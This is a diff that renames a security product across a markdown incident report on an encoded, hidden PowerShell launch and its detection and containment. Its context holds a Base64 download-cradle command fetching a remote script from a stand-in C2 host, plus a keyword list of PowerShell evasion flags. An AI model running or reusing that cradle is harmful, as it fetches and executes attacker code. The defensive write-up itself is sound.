@@ -12,14 +12,14 @@
 
 ## 1. Incident Summary
 
-On September 12, 2026, at 10:43 UTC, SentinelLab's endpoint detection module flagged Windows Event ID 4688 telemetry on `WORKSTATION-CEO`. A double-extension binary (`invoice_2026.pdf.exe`) launched an obfuscated, hidden PowerShell process (`powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc ...`). Inspection in SentinelLab's Safe Educational PowerShell Inspector revealed a download cradle retrieving a remote script (`invoke.ps1`) from an external domain, followed by an outbound TCP 443 beacon to C2 IP `45.33.32.156` by spawned binary `svchost_updater.exe`. SOC analysts initiated emergency containment, quarantining the workstation from the corporate subnet within 15 minutes of initial execution.
+On September 12, 2026, at 10:43 UTC, ThreatWatch's endpoint detection module flagged Windows Event ID 4688 telemetry on `WORKSTATION-CEO`. A double-extension binary (`invoice_2026.pdf.exe`) launched an obfuscated, hidden PowerShell process (`powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc ...`). Inspection in ThreatWatch's Safe Educational PowerShell Inspector revealed a download cradle retrieving a remote script (`invoke.ps1`) from an external domain, followed by an outbound TCP 443 beacon to C2 IP `45.33.32.156` by spawned binary `svchost_updater.exe`. SOC analysts initiated emergency containment, quarantining the workstation from the corporate subnet within 15 minutes of initial execution.
 
 ---
 
 ## 2. Detection
 
 - **Detection Rule**: `RULE-ENDPOINT-003` (`SUSPICIOUS_POWERSHELL`)
-- **Trigger Logic**: The SentinelLab detection engine scans process creation events (Windows Event ID 4688 / Sysmon Event 1) for `powershell.exe` containing evasion flags (`-enc`, `-encodedcommand`, `downloadstring`, `iex`, `-nop`, `-w hidden`, `-exec bypass`).
+- **Trigger Logic**: The ThreatWatch detection engine scans process creation events (Windows Event ID 4688 / Sysmon Event 1) for `powershell.exe` containing evasion flags (`-enc`, `-encodedcommand`, `downloadstring`, `iex`, `-nop`, `-w hidden`, `-exec bypass`).
 - **Alert Dispatched**:
   ```json
   {
@@ -49,7 +49,7 @@ On September 12, 2026, at 10:43 UTC, SentinelLab's endpoint detection module fla
 
 ### Process Creation Hierarchy (Event ID 4688)
 
-Telemetry visualized in SentinelLab's Windows Security view (`/windows`):
+Telemetry visualized in ThreatWatch's Windows Security view (`/windows`):
 
 ```
 PID: 2840  C:\Windows\explorer.exe (User: alex.executive)
@@ -83,7 +83,7 @@ Raw Event Log Record:
 ## 5. Investigation
 
 ### 1. Payload Inspection & Safe Decoding
-Using the built-in SentinelLab Safe Educational PowerShell Inspector (`/windows`), the Base64 argument was inspected without execution:
+Using the built-in ThreatWatch Safe Educational PowerShell Inspector (`/windows`), the Base64 argument was inspected without execution:
 - **Encoded String**:
   `SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALQBjADIALgBuAGUAdAAvAGkAbgB2AG8AawBlAC4AcABzADEAJwApAA==`
 - **Decoded Output**:
@@ -99,7 +99,7 @@ Querying SIEM connection events (`/siem`) revealed that 42 seconds after PowerSh
 
 ## 6. IOC Analysis
 
-Threat Intelligence indicators indexed in SentinelLab (`/iocs`):
+Threat Intelligence indicators indexed in ThreatWatch (`/iocs`):
 
 | Indicator Value | Type | Confidence | Context | Defensive Action |
 | :--- | :---: | :---: | :--- | :--- |
@@ -130,7 +130,7 @@ Threat Intelligence indicators indexed in SentinelLab (`/iocs`):
 
 ## 9. Response / Containment
 
-Executed response actions in SentinelLab Incident Management (`/incidents`):
+Executed response actions in ThreatWatch Incident Management (`/incidents`):
 
 1. **Endpoint Isolation**: Triggered **Isolate Host** on `WORKSTATION-CEO.corp.local` to sever network connectivity while maintaining local forensic access.
 2. **Process Termination**: Terminated active PIDs `4120`, `5884`, and `6104`.
